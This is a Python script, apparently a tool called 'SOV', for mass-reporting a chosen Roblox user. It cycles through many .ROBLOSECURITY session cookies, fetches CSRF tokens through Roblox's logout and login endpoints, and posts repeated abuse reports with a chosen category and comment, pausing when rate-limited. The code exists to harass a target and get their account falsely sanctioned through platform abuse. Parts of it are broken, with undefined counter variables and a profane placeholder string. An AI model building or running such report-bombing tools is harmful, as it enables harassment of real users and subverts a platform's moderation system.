import requests
import threading
import time
from bs4 import BeautifulSoup
from pystyle import Colorate, Colors, Center, Add, Write
import random
import json
bannerText = """

                                                                                                    
    
                    ░██████╗░█████╗░██╗░░░██╗
                    ██╔════╝██╔══██╗██║░░░██║
                    ╚█████╗░██║░░██║╚██╗░██╔╝
                    ░╚═══██╗██║░░██║░╚████╔╝░
                    ██████╔╝╚█████╔╝░░╚██╔╝░░
                    ╚═════╝░░╚════╝░░░░╚═╝░░░     
                                                             [developed by SOV]                                   

     """

banner = Colorate.Vertical(Colors.purple_to_blue, Center.Center(bannerText), 1)
print(banner)

# Configuration (now input-driven)
ROBLOX_USER_ID = Write.Input("Enter the target Roblox user ID: ", Colors.purple_to_blue, interval=0.0025)
print(Colorate.Horizontal(Colors.purple_to_blue, """
[NOTE] Choose the id that fits your report best!
[1] Inappropriate behavior
[2] Asking for/Giving private info
[3] Bullying/Harrasment/Discrimination
[4] Dating
[5] Exploiting/Cheating/Scamming
[6] Account theft - Phishing/Hacking/Trading
[7] Inappropriate Place/Image/Model
[8] Real-life/Suicide threats
[9] Other
""", 1))
REPORT_REASON = int(Write.Input("Enter the violation type ID: ", Colors.purple_to_blue, interval=0.0025))
REPORT_DESCRIPTION = Write.Input("Enter the report description: ", Colors.purple_to_blue, interval=0.0025)
NUM_REPORTS = int(Write.Input("Enter the number of reports to send: ", Colors.purple_to_blue, interval=0.0025))
REPORT_INTERVAL = float(Write.Input("Enter the time in seconds between reports (e.g., 0.5): ", Colors.purple_to_blue, interval=0.0025))

# Cookie input choice
cookie_choice = Write.Input("Enter '1' to use a specific cookie, or '2' to use a random cookie from cookies.txt: ", Colors.purple_to_blue, interval=0.0025)

if cookie_choice == "1":
    cookie = Write.Input("Enter the .ROBLOSECURITY cookie: ", Colors.purple_to_blue, interval=0.0025)
    cookies = [cookie]
elif cookie_choice == "2":
    try:
        with open("cookies.txt", "r") as f:
            cookies = [cookie.strip() for cookie in f.read().split(",")]
    except FileNotFoundError:
        print("Error: cookies.txt not found. Please create the file and add your cookies.")
        exit()
else:
    print("Invalid choice. Exiting.")
    exit()

# Roblox API endpoints
REPORT_URL = f"https://www.roblox.com/abusereport/userprofile?id={ROBLOX_USER_ID}"

# Headers for the request
headers = {
    "Content-Type": "application/json",
    "Referer": f"https://www.roblox.com/users/{ROBLOX_USER_ID}/profile",
    "X-CSRF-TOKEN": "",
    "Cookie": "",  # Cookie will be set in get_csrf_token
}

def get_username_from_userid(user_id):
    url = f"https://users.roblox.com/v1/users/{user_id}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            user_data = response.json()
            return user_data['name']
        else:
            print(f"Error: Unable to fetch username. double check user id, Status Code: {response.status_code}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return None


def get_csrf_token():
    """Gets the CSRF token from Roblox."""
    try:
        cookie = random.choice(cookies)
        session = requests.Session()
        session.cookies.update({".ROBLOSECURITY": cookie})

        logout_response = session.post("https://auth.roblox.com/v2/logout")
        if "x-csrf-token" in logout_response.headers:
            return logout_response.headers["x-csrf-token"]

        report_test_response = session.post(REPORT_URL, headers=headers, json={})  # Empty JSON payload for test
        if report_test_response.status_code == 403 and "x-csrf-token" in report_test_response.headers:
            return report_test_response.headers["x-csrf-token"]

        login_response = session.post("https://auth.roblox.com/v2/login", headers=headers, json={}) #Empty JSON payload for test.
        if "x-csrf-token" in login_response.headers:
            return login_response.headers["x-csrf-token"]

        print("Error: Could not retrieve CSRF token using any method.")
        return None

    except requests.exceptions.RequestException as e:
        print(f"Error getting CSRF token: {e}")
        return None

ValidReports = 0

for i in range(NUM_REPORTS):
    cookie = random.choice(cookies)
    session = requests.Session()

    xcsrfToken = get_csrf_token()

    session.cookies.update({".ROBLOSECURITY": cookie})
    session.headers.update({"referer": "https://www.roblox.com", "x-csrf-token": xcsrfToken})

    requestHTML = session.get("https://www.roblox.com/build/upload")
    soup = BeautifulSoup(requestHTML.text, "html.parser")
    requestVerificationToken = " FOR INDENTATION PURPOSES COCKSUCKERSSSSS "
    
    if requestVerificationToken:
        reportRequest = session.post(
            f"https://www.roblox.com/abusereport/userprofile?id={ROBLOX_USER_ID}",
            data = {
                "X-CSRF-token": xcsrfToken,
                "ReportCategory": REPORT_REASON,
                "Comment": REPORT_DESCRIPTION,
                "Id": ROBLOX_USER_ID,
                "RedirectUrl": f"https://www.roblox.com/users/{ROBLOX_USER_ID}/profile,",
                "PartyGuid": "",
                "ConversationId": ""
            }
        )

        
        if reportRequest.status_code == 200:
            Write.Print(f"[{i}]{get_username_from_userid(ROBLOX_USER_ID)} Was successfully reported \n", Colors.purple_to_blue, interval=0.0025)
            
            global validReports
            validReports += 1
        elif reportRequest.status_code == 429:
            Write.Print(f"[{i}]Rate Limited while reporting {get_username_from_userid(ROBLOX_USER_ID)} going on cooldown for 10 mins. \n", Colors.purple_to_blue, interval=0.0025)
            time.sleep(600) #10 Minute Cooldown (in seconds)
        else:
            Write.Print(f"[{i}]Failed to report {get_username_from_userid(ROBLOX_USER_ID)}. \n", Colors.purple_to_blue, interval=0.0025)
    else:
        Ididthistofixindentationcocksuckers +=1
        
        time.sleep(REPORT_INTERVAL) 


Write.Print(f"Reports attempts made for {get_username_from_userid(ROBLOX_USER_ID)}: {NUM_REPORTS}. Successful: {ValidReports}", Colors.purple_to_blue, interval=0.0025) # Modify if validReports tracking is fixed
Write.Input("Press Enter to exit.", Colors.purple_to_blue, interval=0.0025)
